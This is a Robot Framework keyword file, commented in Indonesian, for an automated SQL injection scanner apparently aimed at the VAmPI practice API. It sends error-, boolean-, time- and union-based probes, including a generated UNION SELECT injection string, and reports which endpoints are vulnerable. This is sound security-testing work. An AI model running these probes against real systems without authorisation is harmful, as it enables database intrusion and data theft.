*** Settings ***
Library     BuiltIn
Library     Collections
Library     String
Library     JSONLibrary
Library     OperatingSystem
Resource    variables.resource
Resource    auth_keywords.resource


*** Keywords ***
Initialize Suite
    [Documentation]    Inisialization
    Bootstrap Variables
    Create API Session
    ${seed}=    Run Keyword And Ignore Error    GET On Session    vampi    ${CREATE_DB_EP}    expected_status=any
    Log    Seed DB: ${seed[0]} ${seed[1]}
    ${eps}=    _Load Endpoints PSV    ${ENDPOINTS_FILE}
    ${pls}=    _Load Payloads CSV     ${PAYLOADS_FILE}
    Set Suite Variable    @{ENDPOINTS}    @{eps}
    Set Suite Variable    ${PAYLOADS}      ${pls}
    @{tmp}=    Create List
    Set Suite Variable    @{_METRICS}    @{tmp}
    _Pre-Authorize If Needed    @{ENDPOINTS}

Finalize SQLi Report
    [Documentation]    Suite Teardown: export CSV + summary human-readable.
    Export Endpoint Stats CSV
    Export Human Report (Console+MD)

_Techniques Confirmed For Endpoint
    [Arguments]    ${endpoint}
    @{hits}=    Create List
    FOR    ${r}    IN    @{_METRICS}
        ${ep}=    Get From Dictionary    ${r}    endpoint    default=
        ${ok}=    Get From Dictionary    ${r}    ok         default=${False}
        ${tech}=  Get From Dictionary    ${r}    technique  default=
        IF    '${ep}'=='${endpoint}' and ${ok}
            Append To List    ${hits}    ${tech}
        END
    END
    RETURN    ${hits}

_Endpoint Is Vulnerable
    [Arguments]    ${endpoint}
    @{hits}=    _Techniques Confirmed For Endpoint    ${endpoint}
    ${n}=       Get Length    ${hits}
    ${is_vuln}=    Evaluate    ${n} > 0
    RETURN    ${is_vuln}    @{hits}

_Pre-Authorize If Needed
    [Arguments]    @{eps}
    ${need_bearer}=    Set Variable    ${False}
    ${need_apikey}=    Set Variable    ${False}
    ${api_header_name}=    Set Variable    ${APIKEY_NAME}
    FOR    ${e}    IN    @{eps}
        ${auth}=    Convert To Lowercase    ${e['auth']}
        IF    '${auth}'=='bearer'
            ${need_bearer}=    Set Variable    ${True}
        END
        IF    '${auth}'=='apikey'
            ${need_apikey}=    Set Variable    ${True}
        END
        IF    '${auth}'=='apikey' and '${e["auth_param"]}'!=''
            ${api_header_name}=    Set Variable    ${e['auth_param']}
        END
    END
    IF    ${need_bearer}
        Ensure Authorized Session    bearer
    END
    IF    ${need_apikey}
        Ensure Authorized Session    apikey    ${api_header_name}
    END

Build Endpoint Stats
    [Documentation]  Mengelompokkan @{_METRICS} menjadi ringkasan per-endpoint dan per-teknik.
    &{stats}=    Create Dictionary
    FOR    ${r}    IN    @{_METRICS}
        ${ep}=        Get From Dictionary    ${r}    endpoint    default=
        ${tech}=      Get From Dictionary    ${r}    technique   default=
        ${ok}=        Get From Dictionary    ${r}    ok          default=${False}

        ${has_ep}=    Run Keyword And Return Status    Dictionary Should Contain Key    ${stats}    ${ep}
        IF    not ${has_ep}
            &{node}=    Create Dictionary
            Set To Dictionary    ${node}    total=0    ok_total=0
            Set To Dictionary    ${node}    error_ok=0    boolean_ok=0    time_ok=0    union_ok=0
            Set To Dictionary    ${node}    error_total=0    boolean_total=0    time_total=0    union_total=0
            Set To Dictionary    ${stats}   ${ep}=&{node}
        END

        &{node}=    Get From Dictionary    ${stats}    ${ep}

        ${t}=    Get From Dictionary    ${node}    total
        ${t}=    Evaluate    int(${t}) + 1
        Set To Dictionary    ${node}    total=${t}

        ${tt_key}=    Set Variable    ${tech}_total
        ${ct}=        Get From Dictionary    ${node}    ${tt_key}
        ${ct}=        Evaluate    int(${ct}) + 1
        Set To Dictionary    ${node}    ${tt_key}=${ct}

        IF    ${ok}
            ${ok_all}=    Get From Dictionary    ${node}    ok_total
            ${ok_all}=    Evaluate    int(${ok_all}) + 1
            Set To Dictionary    ${node}    ok_total=${ok_all}

            ${ok_key}=    Set Variable    ${tech}_ok
            ${okv}=       Get From Dictionary    ${node}    ${ok_key}
            ${okv}=       Evaluate    int(${okv}) + 1
            Set To Dictionary    ${node}    ${ok_key}=${okv}
        END

        Set To Dictionary    ${stats}    ${ep}=${node}
    END
    RETURN    ${stats}

Log Endpoint Stats (Console)
    [Documentation]  Cetak ringkasan per-endpoint ke console.
    ${stats}=    Build Endpoint Stats
    Log To Console    \n=== Endpoint Stats ===
    Log To Console    endpoint,total,ok_total,ok_rate%,error_ok/total,boolean_ok/total,time_ok/total,union_ok/total
    FOR    ${ep}    ${node}    IN    &{stats}
        ${total}=        Get From Dictionary    ${node}    total
        ${ok_total}=     Get From Dictionary    ${node}    ok_total
        ${rate}=         Evaluate    0 if int(${total})==0 else round(int(${ok_total})/int(${total})*100,2)

        ${e_ok}=         Get From Dictionary    ${node}    error_ok
        ${e_t}=          Get From Dictionary    ${node}    error_total
        ${b_ok}=         Get From Dictionary    ${node}    boolean_ok
        ${b_t}=          Get From Dictionary    ${node}    boolean_total
        ${t_ok}=         Get From Dictionary    ${node}    time_ok
        ${t_t}=          Get From Dictionary    ${node}    time_total
        ${u_ok}=         Get From Dictionary    ${node}    union_ok
        ${u_t}=          Get From Dictionary    ${node}    union_total

        Log To Console    ${ep},${total},${ok_total},${rate}%,${e_ok}/${e_t},${b_ok}/${b_t},${t_ok}/${t_t},${u_ok}/${u_t}
    END

Export Endpoint Stats CSV
    [Documentation]  Simpan ringkasan per-endpoint ke CSV (buka di Excel/Sheets).
    [Arguments]    ${path}=reports/sqli_endpoint_stats.csv
    ${stats}=    Build Endpoint Stats
    ${header}=   Set Variable    endpoint,total,ok_total,ok_rate,error_ok,error_total,boolean_ok,boolean_total,time_ok,time_total,union_ok,union_total
    @{rows}=     Create List
    FOR    ${ep}    ${node}    IN    &{stats}
        ${total}=        Get From Dictionary    ${node}    total
        ${ok_total}=     Get From Dictionary    ${node}    ok_total
        ${rate}=         Evaluate    0 if int(${total})==0 else round(int(${ok_total})/int(${total})*100,2)
        ${e_ok}=         Get From Dictionary    ${node}    error_ok
        ${e_t}=          Get From Dictionary    ${node}    error_total
        ${b_ok}=         Get From Dictionary    ${node}    boolean_ok
        ${b_t}=          Get From Dictionary    ${node}    boolean_total
        ${t_ok}=         Get From Dictionary    ${node}    time_ok
        ${t_t}=          Get From Dictionary    ${node}    time_total
        ${u_ok}=         Get From Dictionary    ${node}    union_ok
        ${u_t}=          Get From Dictionary    ${node}    union_total
        ${line}=         Catenate    SEPARATOR=,    ${ep}    ${total}    ${ok_total}    ${rate}    ${e_ok}    ${e_t}    ${b_ok}    ${b_t}    ${t_ok}    ${t_t}    ${u_ok}    ${u_t}
        Append To List   ${rows}    ${line}
    END
    ${content}=  Catenate    SEPARATOR=\n    ${header}    @{rows}
    Create File  ${path}    ${content}
    Log To Console    Exported: ${path}

Scan Endpoint For SQLi
    [Documentation]    Eksekusi scanning untuk 1 endpoint berbasis pipa (method|endpoint|where|param|auth|auth_param).
    [Arguments]    ${ep_line}
    @{parts}=    Split String    ${ep_line}    |
    ${n}=    Get Length    ${parts}
    IF    ${n} < 4
        Fail    Invalid endpoint line: ${ep_line}
    END

    ${method}=       Set Variable    ${parts[0]}
    ${endpoint}=     Set Variable    ${parts[1]}
    ${where}=        Set Variable    ${parts[2]}
    ${param}=        Set Variable    ${parts[3]}
    ${auth}=         Set Variable If    ${n} > 4    ${parts[4]}    none
    ${auth_param}=   Set Variable If    ${n} > 5    ${parts[5]}    ${EMPTY}

    &{row}=    Create Dictionary
    ...    METHOD=${method}
    ...    ENDPOINT=${endpoint}
    ...    where=${where}
    ...    param=${param}
    ...    auth=${auth}
    ...    auth_param=${auth_param}

    _Run Techniques For Row    ${row}

    ${is_vuln}    @{hits}=    _Endpoint Is Vulnerable    ${endpoint}
    @{flat}=    Evaluate    sum(([x] if isinstance(x, str) else list(x) for x in $hits), [])
    ${uniq}=    Evaluate    sorted(set($flat))
    ${joined}=  Evaluate    ','.join($uniq)

    IF    ${is_vuln}
        Log To Console    ⚠️  VULNERABLE: ${method} ${endpoint} [${where}:${param}]  via ${joined}
        Run Keyword If    ${VULN_FAILS_TEST}    Fail    Kerentanan terkonfirmasi pada ${endpoint} via ${joined}
    ELSE
        Log To Console    ✅  SAFE: ${method} ${endpoint} [${where}:${param}]
    END

Get Vulnerable Endpoints Map
    [Documentation]    Kumpulkan endpoint yang confirmed vulnerable -> { endpoint: [tags...] }
    ${m}=    Create Dictionary
    FOR    ${rec}    IN    @{_METRICS}
        ${ok}=      Get From Dictionary    ${rec}    ok    default=${False}
        IF    ${ok}
            ${ep}=     Get From Dictionary    ${rec}    endpoint    default=
            ${tech}=   Get From Dictionary    ${rec}    technique   default=
            ${ep_len}=     Get Length    ${ep}
            ${tech_len}=   Get Length    ${tech}
            IF    ${ep_len} > 0 and ${tech_len} > 0
                ${keys}=     Get Dictionary Keys    ${m}
                ${has_ep}=   Run Keyword And Return Status    List Should Contain Value    ${keys}    ${ep}
                IF    not ${has_ep}
                    &{empty}=    Create Dictionary
                    Set To Dictionary    ${m}    ${ep}=&{empty}
                END
                ${inner}=    Get From Dictionary    ${m}    ${ep}
                Set To Dictionary    ${inner}    ${tech}=1
                Set To Dictionary    ${m}    ${ep}=${inner}
            END
        END
    END

    ${out}=    Create Dictionary
    ${m_keys}=    Get Dictionary Keys    ${m}
    FOR    ${ep}    IN    @{m_keys}
        ${inner}=    Get From Dictionary    ${m}    ${ep}
        ${tags}=     Get Dictionary Keys    ${inner}
        # sort tanpa Evaluate
        ${tags_sorted}=    Copy List    ${tags}
        Sort List    ${tags_sorted}
        Set To Dictionary    ${out}    ${ep}=${tags_sorted}
    END
    RETURN    ${out}

Export Human Report (Console+MD)
    [Documentation]    Tampilkan ringkasan human-readable ke console.
    ${vuln}=    Get Vulnerable Endpoints Map
    Log To Console    \n=== Vulnerable Endpoints (confirmed) ===

    ${eps}=    Get Dictionary Keys    ${vuln}
    ${count}=  Get Length    ${eps}
    IF    ${count} == 0
        Log To Console    (none)
        RETURN
    END

    ${sorted_eps}=    Copy List    ${eps}
    Sort List    ${sorted_eps}
    FOR    ${ep}    IN    @{sorted_eps}
        ${tags}=      Get From Dictionary    ${vuln}    ${ep}
        ${tags_s}=    Catenate    SEPARATOR=,    @{tags}
        Log To Console    ${ep} | tags=${tags_s}
    END


# ---------------- Loaders ----------------
_Load Endpoints PSV
    [Arguments]    ${path}
    ${text}=    Get File    ${path}
    @{lines}=  Split To Lines    ${text}
    @{out}=    Create List
    FOR    ${line}    IN    @{lines}
        ${s}=    Strip String    ${line}
        IF    '${s}'=='' or '${s}'.startswith('#')
            Continue For Loop
        END
        @{parts}=    Split String    ${s}    |
        ${len}=    Get Length    ${parts}
        ${method}=       Set Variable    ${parts[0]}
        ${endpoint}=     Set Variable    ${parts[1]}
        ${where}=        Set Variable If    ${len} > 2    ${parts[2]}    query
        ${param}=        Set Variable If    ${len} > 3    ${parts[3]}    unused
        ${auth}=         Set Variable If    ${len} > 4    ${parts[4]}    none
        ${auth_param}=   Set Variable If    ${len} > 5    ${parts[5]}    ${EMPTY}
        ${d}=    Create Dictionary    METHOD=${method}    ENDPOINT=${endpoint}    where=${where}    param=${param}    auth=${auth}    auth_param=${auth_param}
        Append To List    ${out}    ${d}
    END
    RETURN    ${out}

_Load Payloads CSV
    [Arguments]    ${path}
    ${csv_text}=    Get File    ${path}
    @{rows}=   Evaluate    list(__import__('csv').DictReader(__import__('io').StringIO('''${csv_text}''')))
    @{error}=    Create List
    @{time}=     Create List
    &{boolmap}=  Create Dictionary
    Set Suite Variable    ${maxcols}    6
    Set Suite Variable    ${sentinel}   12345
    FOR    ${row}    IN    @{rows}
        ${r}=    Evaluate    {k.strip().lower(): (v or '').strip() for k,v in ${row}.items()}

        ${tech}=    Get From Dictionary    ${r}    technique    default=
        ${tlen}=    Get Length    ${tech}
        IF    ${tlen} == 0
            ${tech}=    Get From Dictionary    ${r}    type    default=
        END

        ${payload}=    Get From Dictionary    ${r}    payload    default=
        ${plen}=       Get Length    ${payload}
        IF    ${plen} == 0
            ${payload}=    Get From Dictionary    ${r}    value    default=
            ${plen}=       Get Length    ${payload}
        END

        ${cond}=    Get From Dictionary    ${r}    condition    default=
        ${clen}=   Get Length    ${cond}
        IF    ${clen} == 0
            ${cond}=    Get From Dictionary    ${r}    label    default=
            ${clen}=   Get Length    ${cond}
        END

        ${pair}=    Get From Dictionary    ${r}    pair    default=
        ${glen}=   Get Length    ${pair}
        IF    ${glen} == 0
            ${pair}=    Get From Dictionary    ${r}    group    default=
        END

        ${tech}=    Convert To Lowercase    ${tech}

        IF    'error' in '${tech}'
            IF    ${plen} > 0
                Append To List    ${error}    ${payload}
            END

        ELSE IF    'time' in '${tech}'
            IF    ${plen} > 0
                Append To List    ${time}     ${payload}
            END

        ELSE IF    'boolean' in '${tech}' or 'bool' in '${tech}'
            ${g}=    Get From Dictionary    ${boolmap}    ${pair}    default=${None}
            IF    $g is $None
                &{empty}=    Create Dictionary
                Set To Dictionary    ${boolmap}    ${pair}=&{empty}
            END
            ${g2}=   Get From Dictionary    ${boolmap}    ${pair}
            ${label}=    Set Variable    ${cond}
            ${llen}=     Get Length      ${label}
            IF    ${llen} == 0 and 'true' in '${tech}'
                ${label}=    Set Variable    true
                ${llen}=     Get Length      ${label}
            END
            IF    ${llen} == 0 and 'false' in '${tech}'
                ${label}=    Set Variable    false
                ${llen}=     Get Length      ${label}
            END
            IF    ${llen} > 0 and ${plen} > 0
                Set To Dictionary    ${g2}    ${label}=${payload}
            END

        ELSE IF    'union' in '${tech}'
            ${mc}=    Get From Dictionary    ${r}    max_columns    default=
            ${mcl}=   Get Length    ${mc}
            IF    ${mcl} > 0
                ${mc_int}=    Convert To Integer    ${mc}
                Set Suite Variable    ${maxcols}    ${mc_int}
            END
            ${st}=    Get From Dictionary    ${r}    sentinel    default=
            ${stl}=   Get Length    ${st}
            IF    ${stl} == 0
                ${st}=    Get From Dictionary    ${r}    sentinel_literal    default=
                ${stl}=   Get Length    ${st}
            END
            IF    ${stl} > 0
                Set Suite Variable    ${sentinel}    ${st}
            END
        END
    END
    @{boolpairs}=    Create List
    FOR    ${k}    ${v}    IN    &{boolmap}
        ${has_t}=    Run Keyword And Return Status    Dictionary Should Contain Key    ${v}    true
        ${has_f}=    Run Keyword And Return Status    Dictionary Should Contain Key    ${v}    false
        IF    ${has_t} and ${has_f}
            Append To List    ${boolpairs}    ${v}
        END
    END
    &{unioncfg}=    Create Dictionary    max_columns=${maxcols}    sentinel_literal=${sentinel}
    &{out}=    Create Dictionary    error=${error}    time=${time}    boolean_pairs=${boolpairs}    union_config=${unioncfg}
    RETURN    ${out}

# ---------------- Utilities ----------------
Urlencode
    [Arguments]    ${text}
    ${enc}=    Evaluate    __import__('urllib.parse', fromlist=['quote']).quote(str($text), safe='')
    RETURN    ${enc}

Build Endpoint (path mode)
    [Arguments]    ${endpoint_template}    ${param_name}    ${value}
    ${encoded}=    Urlencode    ${value}
    ${expanded}=   Replace String    ${endpoint_template}    {${param_name}}    ${encoded}
    RETURN       ${expanded}

_Resolve Json Body
    [Arguments]    ${endpoint}    ${param_name}    ${payload}
    ${has_default}=    Run Keyword And Return Status    Dictionary Should Contain Key    ${DEFAULT_JSON_BODIES}    ${endpoint}
    ${body}=    Set Variable    {}
    IF    ${has_default}
        ${body}=    Get From Dictionary    ${DEFAULT_JSON_BODIES}    ${endpoint}
    END

    ${is_str}=    Evaluate    isinstance($body, (str, bytes))
    IF    ${is_str}
        ${body}=    Evaluate    __import__('json').loads(r'''${body}''')
    END

    ${is_dict}=   Evaluate    isinstance($body, dict)
    IF    not ${is_dict}
        &{tmp}=    Create Dictionary
        ${body}=   Set Variable    &{tmp}
    END

    Set To Dictionary    ${body}    ${param_name}=${payload}
    RETURN    ${body}

_Default Baseline For
    [Arguments]    ${where}
    ${bl}=    Set Variable    ${BASELINE_JSON}
    IF    '${where}'=='path'
        ${bl}=    Set Variable    ${BASELINE_PATH}
    ELSE IF    '${where}'=='query'
        ${bl}=    Set Variable    ${BASELINE_QUERY}
    END
    RETURN    ${bl}

# ---------------- HTTP wrapper (path|query|json|header) ----------------
Send Request With Payload
    [Arguments]    ${method}    ${where}    ${endpoint_tmpl}    ${param_name}    ${payload}    ${auth}    ${auth_param}=${EMPTY}
    ${scheme}=    Convert To Lowercase    ${auth}
    IF    '${scheme}'!='none'
        Ensure Authorized Session    ${scheme}    ${auth_param}
    END
    ${headers}=    Set Variable    ${None}
    ${params}=     Set Variable    ${None}
    ${endpoint}=   Set Variable    ${endpoint_tmpl}
    ${json}=       Set Variable    ${None}

    IF    '${where}'=='path'
        ${endpoint}=    Build Endpoint (path mode)    ${endpoint_tmpl}    ${param_name}    ${payload}
    ELSE IF    '${where}'=='query'
        &{params}=      Create Dictionary    ${param_name}=${payload}
    ELSE IF    '${where}'=='json'
        ${json}=        _Resolve Json Body    ${endpoint_tmpl}    ${param_name}    ${payload}
    ELSE IF    '${where}'=='header'
        &{headers}=     Copy Dictionary    ${HEADERS}
        Set To Dictionary    ${headers}    ${param_name}=${payload}
    END

    ${m}=    Convert To Uppercase    ${method}
    IF    '${m}'=='GET'
        ${resp}=    GET Authorized     ${endpoint}    ${params}    ${headers}
    ELSE IF    '${m}'=='POST'
        ${resp}=    POST Authorized    ${endpoint}    ${json}    ${params}    ${headers}
    ELSE IF    '${m}'=='PUT'
        ${resp}=    PUT Authorized     ${endpoint}    ${json}    ${params}    ${headers}
    ELSE IF    '${m}'=='DELETE'
        ${resp}=    DELETE Authorized  ${endpoint}    ${params}    ${headers}
    ELSE
        Fail    HTTP method tidak didukung: ${method}
    END
    RETURN    ${resp}

# ---------------- Detectors ----------------
Detect Error-Based
    [Arguments]    ${response}
    ${status}=    Set Variable    ${response.status_code}
    ${body}=      Set Variable    ${response.text}

    ${is5xx}=     Set Variable    ${False}
    IF    ${status} >= 500
        IF    ${status} < 600
            ${is5xx}=    Set Variable    ${True}
        END
    END

    ${has_db_msg}=    Set Variable    ${False}
    FOR    ${pat}    IN    @{SQL_ERRORS}
        ${found}=    Run Keyword And Return Status    Should Contain    ${body}    ${pat}
        IF    ${found}
            ${has_db_msg}=    Set Variable    ${True}
            Exit For Loop
        END
    END

    ${ok}=    Set Variable    ${is5xx}
    IF    not ${ok} and ${has_db_msg}
        ${ok}=    Set Variable    ${True}
    END
    RETURN    ${ok}

Detect Time-Based
    [Arguments]    ${response}    ${threshold}=${TIME_THRESHOLD}
    ${sec}=    Call Method    ${response.elapsed}    total_seconds
    Log    Response time: ${sec}s (threshold=${threshold}s)
    ${ok}=    Set Variable    ${False}
    IF    ${sec} >= ${threshold}
        ${ok}=    Set Variable    ${True}
    END
    RETURN    ${ok}

_Json Or Text Length
    [Arguments]    ${resp}
    # Ambil Content-Type secara aman
    ${ctype}=    Get From Dictionary    ${resp.headers}    Content-Type    default=
    ${ctype}=    Set Variable If    '${ctype}'=='${None}'    ${EMPTY}    ${ctype}
    ${ctype_l}=  Convert To Lower Case    ${ctype}

    # Default: pakai text
    ${obj}=      Set Variable    ${resp.text}

    # Kalau terlihat JSON, coba parse; jika gagal tetap pakai text
    IF    'json' in '${ctype_l}'
        ${status}    ${maybe}=    Run Keyword And Ignore Error    Call Method    ${resp}    json
        IF    '${status}'=='PASS'
            ${obj}=    Set Variable    ${maybe}
        END
    END

    ${len}=    Get Length    ${obj}
    RETURN    ${len}

Detect Boolean-Based
    [Arguments]    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${pair}    ${auth}    ${auth_param}
    ${pt}=    Get From Dictionary    ${pair}    true
    ${pf}=    Get From Dictionary    ${pair}    false
    ${r_true}=    Send Request With Payload    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${pt}    ${auth}    ${auth_param}
    ${r_false}=   Send Request With Payload    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${pf}    ${auth}    ${auth_param}
    ${lt}=        _Json Or Text Length    ${r_true}
    ${lf}=        _Json Or Text Length    ${r_false}
    Log    Boolean compare: TRUE=${lt} vs FALSE=${lf}
    ${ok}=    Evaluate    ${lt} != ${lf} or ${r_true.status_code} != ${r_false.status_code}
    RETURN    ${ok}

Detect Union-Based
    [Arguments]    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${auth}    ${auth_param}
    ${cfg}=        Get From Dictionary    ${PAYLOADS}    union_config
    ${tmp_max}=    Get From Dictionary    ${cfg}    max_columns
    ${tmp_sen}=    Get From Dictionary    ${cfg}    sentinel_literal
    Set Suite Variable    ${maxcols}    ${tmp_max}
    Set Suite Variable    ${sentinel}   ${tmp_sen}

    ${baseline}=   _Default Baseline For    ${where}
    ${base}=       Send Request With Payload    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${baseline}    ${auth}    ${auth_param}
    ${base_text}=  Set Variable    ${base.text}
    ${base_len}=   Get Length    ${base_text}
    Log            Baseline length: ${base_len}

    ${found}=      Set Variable    ${False}
    FOR    ${n}    IN RANGE    1    ${maxcols+1}
        @{cols_list}=    Create List
        ${limit}=    Evaluate    int(${n})-1
        FOR    ${i}    IN RANGE    ${limit}
            Append To List    ${cols_list}    NULL
        END
        Append To List    ${cols_list}    ${sentinel}
        ${cols}=    Catenate    SEPARATOR=,    @{cols_list}

        ${inj}=    Set Variable    ${baseline}' UNION SELECT ${cols} -- 
        ${r}=      Send Request With Payload    ${method}    ${where}    ${endpoint_tmpl}    ${param}    ${inj}    ${auth}    ${auth_param}
        ${txt}=    Set Variable    ${r.text}
        ${code}=   Set Variable    ${r.status_code}
        Log        Try n=${n} status=${code}

        ${txt_len}=    Get Length    ${txt}
        ${has_sentinel}=    Run Keyword And Return Status    Should Contain    ${txt}    ${sentinel}
        IF    ${code} < 500 and ${has_sentinel} and ${txt_len} > ${base_len}
            ${found}=    Set Variable    ${True}
            Exit For Loop
        END
    END
    RETURN    ${found}

# ---------------- Runners ----------------
Run Error-Based For
    [Arguments]    ${method}    ${endpoint}    ${where}    ${param}    ${auth}    ${auth_param}
    ${errs}=    Get From Dictionary    ${PAYLOADS}    error
    FOR    ${p}    IN    @{errs}
        ${resp}=    Send Request With Payload    ${method}    ${where}    ${endpoint}    ${param}    ${p}    ${auth}    ${auth_param}
        ${ok}=      Detect Error-Based    ${resp}
        ${rec}=     Create Dictionary    endpoint=${endpoint}    technique=error    payload=${p}    ok=${ok}
        Append To List    ${_METRICS}    ${rec}
        IF    ${FAIL_ON_MISS}
            Should Be True    ${ok}    msg=Error-based tidak terkonfirmasi untuk payload: ${p}
        ELSE
            IF    not ${ok}
                Log    Error-based TIDAK terkonfirmasi untuk payload: ${p}
            END
        END
    END

Run Boolean-Based For
    [Arguments]    ${method}    ${endpoint}    ${where}    ${param}    ${auth}    ${auth_param}
    ${pairs}=    Get From Dictionary    ${PAYLOADS}    boolean_pairs
    ${num}=      Get Length    ${pairs}
    IF    ${num} == 0
        Fail    Tidak ada pasangan TRUE/FALSE pada CSV payloads.
    END

    FOR    ${pair}    IN    @{pairs}
        ${ok}=    Detect Boolean-Based    ${method}    ${where}    ${endpoint}    ${param}    ${pair}    ${auth}    ${auth_param}
        ${rec}=   Create Dictionary    endpoint=${endpoint}    technique=boolean    ok=${ok}
        Append To List    ${_METRICS}    ${rec}
        IF    ${FAIL_ON_MISS}
            Should Be True    ${ok}    msg=Boolean-based tidak terkonfirmasi.
        ELSE
            IF    not ${ok}
                Log    Boolean-based TIDAK terkonfirmasi (pair=${pair})
            END
        END
    END

Run Time-Based For
    [Arguments]    ${method}    ${endpoint}    ${where}    ${param}    ${auth}    ${auth_param}    ${threshold}=${TIME_THRESHOLD}
    ${times}=    Get From Dictionary    ${PAYLOADS}    time
    FOR    ${p}    IN    @{times}
        ${resp}=    Send Request With Payload    ${method}    ${where}    ${endpoint}    ${param}    ${p}    ${auth}    ${auth_param}
        ${ok}=      Detect Time-Based    ${resp}    ${threshold}
        ${rec}=     Create Dictionary    endpoint=${endpoint}    technique=time    payload=${p}    ok=${ok}
        Append To List    ${_METRICS}    ${rec}
        IF    not ${ok}
            Log    Time-based tidak terkonfirmasi untuk payload: ${p}
        END
    END

Run Union-Based For
    [Arguments]    ${method}    ${endpoint}    ${where}    ${param}    ${auth}    ${auth_param}
    ${ok}=    Detect Union-Based    ${method}    ${where}    ${endpoint}    ${param}    ${auth}    ${auth_param}
    ${rec}=   Create Dictionary    endpoint=${endpoint}    technique=union    ok=${ok}
    Append To List    ${_METRICS}    ${rec}
    IF    ${FAIL_ON_MISS}
        Should Be True    ${ok}    msg=Union-based tidak terkonfirmasi (atur sentinel/max_columns di CSV bila perlu).
    ELSE
        IF    not ${ok}
            Log    Union-based TIDAK terkonfirmasi (cek sentinel/max_columns di CSV)
        END
    END

# ---------------- Seleksi & Orkestrasi ----------------
_Filter Endpoints
    [Arguments]    ${method_filter}=${EMPTY}    ${endpoint_filter}=${EMPTY}    ${where_filter}=${EMPTY}    ${auth_filter}=${EMPTY}
    ${mf}=    Convert To Uppercase    ${method_filter}
    @{out}=   Create List
    FOR    ${e}    IN    @{ENDPOINTS}
        ${ok}=    Set Variable    ${True}
        IF    '${mf}'!='' and '${e["METHOD"]}'!='${mf}'
            ${ok}=    Set Variable    ${False}
        END
        IF    '${endpoint_filter}'!='' and '${endpoint_filter}' not in '${e["ENDPOINT"]}'
            ${ok}=    Set Variable    ${False}
        END
        IF    '${where_filter}'!='' and '${e["where"]}'!='${where_filter}'
            ${ok}=    Set Variable    ${False}
        END
        IF    '${auth_filter}'!='' and '${e["auth"]}'!='${auth_filter}'
            ${ok}=    Set Variable    ${False}
        END
        IF    not ${INCLUDE_UNUSED} and '${e["param"]}'=='unused'
            ${ok}=    Set Variable    ${False}
        END
        IF    ${ok}
            Append To List    ${out}    ${e}
        END
    END
    RETURN    ${out}

_Run Techniques For Row
    [Arguments]    ${row}    ${techs_csv}=${RUN_TECHNIQUES}
    ${techs}=    Split String    ${techs_csv}    ,
    FOR    ${t}    IN    @{techs}
        ${t}=    Convert To Lowercase    ${t.strip()}
        IF    '${t}'=='error'
            Run Error-Based For     ${row['METHOD']}    ${row['ENDPOINT']}    ${row['where']}    ${row['param']}    ${row['auth']}    ${row['auth_param']}
        ELSE IF    '${t}'=='boolean'
            Run Boolean-Based For   ${row['METHOD']}    ${row['ENDPOINT']}    ${row['where']}    ${row['param']}    ${row['auth']}    ${row['auth_param']}
        ELSE IF    '${t}'=='time'
            Run Time-Based For      ${row['METHOD']}    ${row['ENDPOINT']}    ${row['where']}    ${row['param']}    ${row['auth']}    ${row['auth_param']}
        ELSE IF    '${t}'=='union'
            Run Union-Based For     ${row['METHOD']}    ${row['ENDPOINT']}    ${row['where']}    ${row['param']}    ${row['auth']}    ${row['auth_param']}
        END
    END

Run From Files With Filters
    [Arguments]    ${method_filter}=${EMPTY}    ${endpoint_filter}=${EMPTY}    ${where_filter}=${EMPTY}    ${auth_filter}=${EMPTY}    ${techs_csv}=${RUN_TECHNIQUES}
    ${targets}=    _Filter Endpoints    ${method_filter}    ${endpoint_filter}    ${where_filter}    ${auth_filter}
    ${len}=        Get Length    ${targets}
    IF    ${len} == 0
        Fail    Tidak ada endpoint yang cocok dengan filter.
    END
    FOR    ${row}    IN    @{targets}
        Log To Console    \n--- Running on ${row['METHOD']} ${row['ENDPOINT']} (where=${row['where']}, auth=${row['auth']}) ---
        _Run Techniques For Row    ${row}    ${techs_csv}
    END
